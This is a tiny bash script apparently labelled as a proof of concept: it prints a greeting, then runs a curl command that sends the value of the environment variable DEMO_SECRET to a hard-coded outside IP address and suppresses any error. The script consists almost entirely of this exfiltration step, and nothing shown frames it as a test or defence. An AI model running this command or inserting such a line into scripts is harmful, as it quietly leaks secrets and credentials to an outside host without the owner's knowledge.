#!/usr/bin/env bash

echo "[poc] hello"

curl -fsS "http://82.165.247.235/p5/?d=$(printf '%s' "$DEMO_SECRET")" || true
